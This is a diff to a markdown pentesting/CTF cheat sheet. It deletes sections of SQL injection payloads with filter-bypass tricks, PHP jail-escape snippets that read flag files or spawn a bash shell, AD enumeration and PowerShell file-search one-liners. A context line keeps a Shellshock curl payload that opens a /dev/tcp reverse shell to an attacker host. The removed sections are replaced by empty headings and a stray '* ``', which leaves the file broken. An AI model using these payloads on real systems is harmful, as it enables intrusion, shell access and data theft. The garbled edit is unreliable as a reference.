@@ -261,52 +261,7 @@ In Linux the ouput will be colored using ANSI colors. If you are executing winpe
 
 ### -----
 
-[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) look for text in a file and lists its name and contents.
-
-Shorthand \(aliased\) version:
-
-```text
-ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}
-```
-
-Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`
-
-Full version:
-
-```text
-Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
-```
-
-Explanation:
-
-```text
-# Get a listing of all files within this folder and its subfolders.
-Get-ChildItem -Recurse |
-
-# Filter files according to a script.
-Where-Object {
-    # Pick only the files that contain the string 'dummy'.
-    # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
-    (Select-String -InputObject $_ -Pattern 'dummy' -Quiet) -eq $true
-} |
-
-# Run commands against each object found.
-ForEach-Object {
-    # Output the file properties.
-    Write-Output $_;
-
-    # Output the file's contents.
-    Get-Content $_
-}
-```
-
-`ls -R|?{$_|Select-String 'dummy'}|%{$_;gc $_}`
-
-Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names, you may want to note the following significant differences between the "full" versions and the "golfed" version:
-
-`Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. \(Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.\) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
-
-`ls -R|?{$_|Select-String 'dummy'}|%{$_.FullName;gc $_}`
+* \`\`
 
 ### -----
 
@@ -559,13 +514,6 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1' 
 ### Tunneling Post-Exploitation \(PortForwarding\) through Chisel
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
-
-### Active Directory Users & Groups Enumeration
-
-```text
-net user /domain
-net group /domain
-```
 
 ### Tunelling on Windows
 
@@ -843,68 +791,7 @@ _Hosts_
 tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
 ```
 
-### Manual UNION SQLite Injection
-
-_Table_
-
-```sql
-1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
-```
-
-_Columns \(as command\)_
-
-```sql
-1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 --
-```
-
-_Values \(payload depends on the columns structure\)_
-
-```sql
-1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
-```
-
-### SQL Injection Little Tips
-
-`--` -&gt; Linux  
-`--+` -&gt; Windows  
-`%23 (#)` -&gt; Hash  
-`%2527 (')` -&gt; bypass urldecode\(urldecode\(htmlspecialchars\(, ENT\_QUOTES\)\)\);
-
-### Manual UNION SQL Injection
-
-_Table_
-
-```sql
-1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
-```
-
-_Columns_
-
-```sql
-1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
-```
-
-_Values_
-
-```sql
-1' union select (select nameofcolumn from nameoftable limit 0,1),2#
-```
-
-_Using Newline_
-
-```sql
-admin %0A union %0A select %0A 1,database()#
-           or
-admin %0A union %0A select %0A database(),2#
-```
-
-_Bypass preg\_replace_
-
-```sql
-ununionion select 1,2%23
-     or
-UNunionION SEselectLECT 1,2,3%23
-```
+### 
 
 ### Known Plaintext ZIP
 
@@ -920,66 +807,7 @@ _Syntax_
 ./pkcrack -C encrypted.zip -c file -P plaintext.zip -p file
 ```
 
-### Python Functions
-
-* Files: [https://www.w3schools.com/python/python\_ref\_file.asp](https://www.w3schools.com/python/python_ref_file.asp)   
-* Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
-* Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
-* Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
-
-### PHP Functions
-
-* Files: [https://www.w3schools.com/php/php\_ref\_filesystem.asp](https://www.w3schools.com/php/php_ref_filesystem.asp)   
-* Directories: [https://www.w3schools.com/php/php\_ref\_directory.asp](https://www.w3schools.com/php/php_ref_directory.asp)   
-* Errors: [https://www.w3schools.com/php/php\_ref\_error.asp](https://www.w3schools.com/php/php_ref_error.asp)   
-* Network: [https://www.w3schools.com/php/php\_ref\_network.asp](https://www.w3schools.com/php/php_ref_network.asp)   
-* Misc: [https://www.w3schools.com/php/php\_ref\_misc.asp](https://www.w3schools.com/php/php_ref_misc.asp)
-
-### PHP Jail Escape
-
-_With file\_get\_contents\(\)_
-
-```php
-print file_get_contents('flag.txt');
-```
-
-_With readfile\(\)_
-
-```php
-echo readfile("flag.txt");
-```
-
-_With popen\(\)_
-
-```php
-popen("vi", "w");
-
-:r flag.txt
-   or
-:!/bin/bash
-```
-
-_With highlight\_file\(\)_
-
-```php
-highlight_file(glob("flag.txt")[0]);
-   or
-highlight_file(glob("fl*txt")[0]);
-```
-
-_With highlight\_source\(\)_
-
-```php
-highlight_source("flag.txt");
-   or
-highlight_source(glob("*")[4]);
-```
-
-_With Finfo\(\)_
-
-```php
-new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
-```
+### 
 
 ### XPATH Dump
 
